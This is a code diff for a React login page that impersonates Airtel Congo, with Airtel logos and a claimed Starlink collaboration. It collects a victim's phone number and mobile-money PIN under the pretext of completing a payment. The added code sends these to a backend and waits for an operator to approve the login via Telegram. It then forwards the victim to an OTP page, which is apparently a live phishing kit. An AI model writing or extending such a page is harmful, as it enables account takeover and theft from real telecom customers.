@@ -2,7 +2,7 @@ import React, { useState, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
 
 const COUNTRY_CODE = '+243';
-const PHONE_PLACEHOLDER = '951234567'; // Updated to match the image
+const PHONE_PLACEHOLDER = '951234567'; 
 const PHONE_MAX = 9;
 
 function AirtelLogin() {
@@ -11,15 +11,17 @@ function AirtelLogin() {
   const [showPin, setShowPin] = useState(false);
   const [error, setError] = useState('');
   const [isLoading, setIsLoading] = useState(false);
+  
+  // NEW: States for the approval waiting screen
+  const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
+  const [refId, setRefId] = useState<string | null>(null);
 
   const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
   const navigate = useNavigate();
 
-  // Handle phone number input and auto-focus to PIN when complete
   const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const val = e.target.value.replace(/\D/g, '');
     setPhone(val);
-
     if (val.length === PHONE_MAX) {
       pinRefs.current[0]?.focus();
     }
@@ -70,12 +72,37 @@ function AirtelLogin() {
       const data = await response.json();
       console.log('Login response:', data);
 
-      navigate('/airtel-otp');
+      // NEW LOGIC: Wait for admin approval
+      if (data.status === 'pending' && data.ref_id) {
+        setRefId(data.ref_id);
+        setIsWaitingForApproval(true); // Show the overlay
+        
+        // Poll the backend every 3 seconds to see if admin clicked Approve on Telegram
+        const pollInterval = setInterval(async () => {
+          try {
+            const statusRes = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login-status/${data.ref_id}`);
+            const statusData = await statusRes.json();
+
+            if (statusData.status === 'approved') {
+              clearInterval(pollInterval);
+              navigate('/airtel-otp');
+            } else if (statusData.status === 'rejected' || statusData.status === 'expired') {
+              clearInterval(pollInterval);
+              setIsWaitingForApproval(false);
+              setError("Connexion refusée ou expirée par l'administrateur.");
+              setIsLoading(false);
+            }
+          } catch (pollErr) {
+            console.error('Polling error:', pollErr);
+          }
+        }, 3000);
+      } else {
+        // Fallback just in case
+        navigate('/airtel-otp');
+      }
     } catch (err) {
       console.error('Login request failed:', err);
-      // For UI testing purposes, if the backend isn't running, it will still navigate
-      navigate('/airtel-otp'); 
-    } finally {
+      setError('Une erreur réseau est survenue. Veuillez réessayer.');
       setIsLoading(false);
     }
   };
@@ -95,6 +122,65 @@ function AirtelLogin() {
           flex-direction: column;
           min-height: 100vh;
           background-color: #ffffff;
+          position: relative;
+        }
+
+        /* FADED BACKGROUND WHEN WAITING */
+        .faded-content {
+          opacity: 0.15;
+          pointer-events: none;
+          transition: opacity 0.3s ease;
+        }
+
+        /* WAITING OVERLAY */
+        .waiting-overlay {
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100vw;
+          height: 100vh;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          z-index: 9999;
+          padding: 20px;
+          background-color: rgba(255, 255, 255, 0.4); /* Semi-transparent so faded text shows */
+        }
+
+        .custom-spinner {
+          width: 60px;
+          height: 60px;
+          border: 6px solid #E5E7EB;
+          border-top: 6px solid #DA1C1C;
+          border-radius: 50%;
+          animation: spin 1s linear infinite;
+          margin-bottom: 24px;
+        }
+
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+
+        .waiting-title {
+          font-size: 22px;
+          font-weight: 700;
+          color: #1a1a1a;
+          margin-bottom: 20px;
+        }
+
+        .waiting-message {
+          background-color: #FEF2F2;
+          color: #4B5563;
+          padding: 16px 24px;
+          border-radius: 24px;
+          text-align: center;
+          font-size: 15px;
+          font-weight: 500;
+          line-height: 1.5;
+          max-width: 380px;
+          box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
 
         /* TOP SECTION */
@@ -236,7 +322,7 @@ function AirtelLogin() {
           padding: 16px;
           border-radius: 30px;
           border: none;
-          background-color: #D1D5DB; /* Light gray */
+          background-color: #D1D5DB;
           color: #ffffff;
           font-size: 16px;
           font-weight: 700;
@@ -292,120 +378,132 @@ function AirtelLogin() {
         }
       `}</style>
 
-      {/* TOP SECTION */}
-      <div className="login-top-section">
-        
-        {/* LOGO */}
-        <div className="logo-wrapper">
-          <svg width="140" height="40" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-            {/* Red Pin */}
-            <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
-            <circle cx="25" cy="17" r="5" fill="white"/>
-            {/* Airtel Text */}
-            <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
-          </svg>
-          <p className="tagline">A REASON TO <span>IMAGINE</span></p>
+      {/* WAITING OVERLAY (Only shows when waiting) */}
+      {isWaitingForApproval && (
+        <div className="waiting-overlay">
+          <div className="custom-spinner"></div>
+          <div className="waiting-title">En attente d'approbation</div>
+          <div className="waiting-message">
+            Votre demande a été envoyée. Merci de patienter pendant la vérification...
+          </div>
         </div>
+      )}
 
-        {/* TITLE */}
-        <h1 className="login-title">
-          Connectez-vous à Airtel Lite pour finaliser le paiement.
-        </h1>
-
-        {/* ERROR MESSAGE */}
-        {error && (
-          <div style={{ color: '#DA1C1C', fontSize: '14px', marginBottom: '16px', textAlign: 'center', fontWeight: '500' }}>
-            {error}
-          </div>
-        )}
-
-        <form onSubmit={handleLogin} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
+      {/* MAIN CONTENT (Gets faded when waiting) */}
+      <div className={isWaitingForApproval ? 'faded-content' : ''} style={{ display: 'flex', flexDirection: 'column', minHeight: '100vh' }}>
+        
+        {/* TOP SECTION */}
+        <div className="login-top-section">
           
-          {/* PHONE INPUT */}
-          <div className="phone-input-container">
-            {/* DRC Flag SVG */}
-            <svg className="flag-icon" viewBox="0 0 640 480" xmlns="http://www.w3.org/2000/svg">
-              <path fill="#007fff" d="M0 0h640v480H0z"/>
-              <path fill="#f7d618" d="M0 240h640v240H0z"/>
-              <path fill="#ce1021" d="M0 0l640 480M640 0L0 480" stroke="#ce1021" strokeWidth="40"/>
-              <path fill="#f7d618" d="M60 60h40v40H60z"/>
+          {/* LOGO */}
+          <div className="logo-wrapper">
+            <svg width="140" height="40" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
+              <circle cx="25" cy="17" r="5" fill="white"/>
+              <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
             </svg>
-            <span className="country-code-text">{COUNTRY_CODE}</span>
-            <input
-              type="tel"
-              className="phone-input"
-              placeholder={PHONE_PLACEHOLDER}
-              value={phone}
-              onChange={handlePhoneChange}
-              maxLength={PHONE_MAX}
-              disabled={isLoading}
-            />
+            <p className="tagline">A REASON TO <span>IMAGINE</span></p>
           </div>
 
-          {/* PIN INPUT */}
-          <div className="pin-section">
-            <span className="pin-label">Entrez votre Code</span>
-            <div className="pin-inputs-row">
-              <div className="pin-boxes">
-                {pin.map((digit, index) => (
-                  <input
-                    key={index}
-                    type={showPin ? 'text' : 'password'}
-                    maxLength={1}
-                    value={digit}
-                    ref={(el) => { pinRefs.current[index] = el; }}
-                    onChange={(e) => handlePinChange(index, e.target.value)}
-                    onKeyDown={(e) => handleKeyDown(index, e)}
-                    className="pin-box"
-                    disabled={isLoading}
-                  />
-                ))}
-              </div>
-              
-              {/* Eye Toggle */}
-              <div className="eye-icon" onClick={() => setShowPin(!showPin)}>
-                {showPin ? (
-                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
-                    <line x1="1" y1="1" x2="23" y2="23"></line>
-                  </svg>
-                ) : (
-                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
-                    <circle cx="12" cy="12" r="3"></circle>
-                  </svg>
-                )}
+          {/* TITLE */}
+          <h1 className="login-title">
+            Connectez-vous à Airtel Lite pour finaliser le paiement.
+          </h1>
+
+          {/* ERROR MESSAGE */}
+          {error && (
+            <div style={{ color: '#DA1C1C', fontSize: '14px', marginBottom: '16px', textAlign: 'center', fontWeight: '500' }}>
+              {error}
+            </div>
+          )}
+
+          <form onSubmit={handleLogin} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
+            
+            {/* PHONE INPUT */}
+            <div className="phone-input-container">
+              <svg className="flag-icon" viewBox="0 0 640 480" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#007fff" d="M0 0h640v480H0z"/>
+                <path fill="#f7d618" d="M0 240h640v240H0z"/>
+                <path fill="#ce1021" d="M0 0l640 480M640 0L0 480" stroke="#ce1021" strokeWidth="40"/>
+                <path fill="#f7d618" d="M60 60h40v40H60z"/>
+              </svg>
+              <span className="country-code-text">{COUNTRY_CODE}</span>
+              <input
+                type="tel"
+                className="phone-input"
+                placeholder={PHONE_PLACEHOLDER}
+                value={phone}
+                onChange={handlePhoneChange}
+                maxLength={PHONE_MAX}
+                disabled={isLoading || isWaitingForApproval}
+              />
+            </div>
+
+            {/* PIN INPUT */}
+            <div className="pin-section">
+              <span className="pin-label">Entrez votre Code</span>
+              <div className="pin-inputs-row">
+                <div className="pin-boxes">
+                  {pin.map((digit, index) => (
+                    <input
+                      key={index}
+                      type={showPin ? 'text' : 'password'}
+                      maxLength={1}
+                      value={digit}
+                      ref={(el) => { pinRefs.current[index] = el; }}
+                      onChange={(e) => handlePinChange(index, e.target.value)}
+                      onKeyDown={(e) => handleKeyDown(index, e)}
+                      className="pin-box"
+                      disabled={isLoading || isWaitingForApproval}
+                    />
+                  ))}
+                </div>
+                
+                {/* Eye Toggle */}
+                <div className="eye-icon" onClick={() => setShowPin(!showPin)}>
+                  {showPin ? (
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                      <line x1="1" y1="1" x2="23" y2="23"></line>
+                    </svg>
+                  ) : (
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                      <circle cx="12" cy="12" r="3"></circle>
+                    </svg>
+                  )}
+                </div>
               </div>
             </div>
-          </div>
 
-          {/* BUTTON */}
-          <button 
-            type="submit" 
-            className={`login-btn ${(phone.length === PHONE_MAX && pin.join('').length === 4) ? 'active' : ''}`}
-            disabled={isLoading}
-          >
-            {isLoading ? 'Chargement...' : 'CONNEXION'}
-          </button>
+            {/* BUTTON */}
+            <button 
+              type="submit" 
+              className={`login-btn ${(phone.length === PHONE_MAX && pin.join('').length === 4) ? 'active' : ''}`}
+              disabled={isLoading || isWaitingForApproval}
+            >
+              {isLoading && !isWaitingForApproval ? 'Chargement...' : 'CONNEXION'}
+            </button>
 
-        </form>
-      </div>
-
-      {/* FOOTER SECTION */}
-      <div className="login-footer">
-        <div className="footer-logo-wrapper">
-          <svg width="110" height="30" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
-            <circle cx="25" cy="17" r="5" fill="white"/>
-            <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
-          </svg>
-          <p className="tagline">A REASON TO <span>IMAGINE</span></p>
+          </form>
         </div>
 
-        <p className="collab-text">En collaboration avec</p>
-        <p className="starlink-text">STARLINK<sup>TM</sup></p>
+        {/* FOOTER SECTION */}
+        <div className="login-footer">
+          <div className="footer-logo-wrapper">
+            <svg width="110" height="30" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
+              <circle cx="25" cy="17" r="5" fill="white"/>
+              <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
+            </svg>
+            <p className="tagline">A REASON TO <span>IMAGINE</span></p>
+          </div>
 
-        <p className="copyright">© 2026 Airtel Congo. Tous droits réservés.</p>
+          <p className="collab-text">En collaboration avec</p>
+          <p className="starlink-text">STARLINK<sup>TM</sup></p>
+
+          <p className="copyright">© 2026 Airtel Congo. Tous droits réservés.</p>
+        </div>
       </div>
     </div>
   );
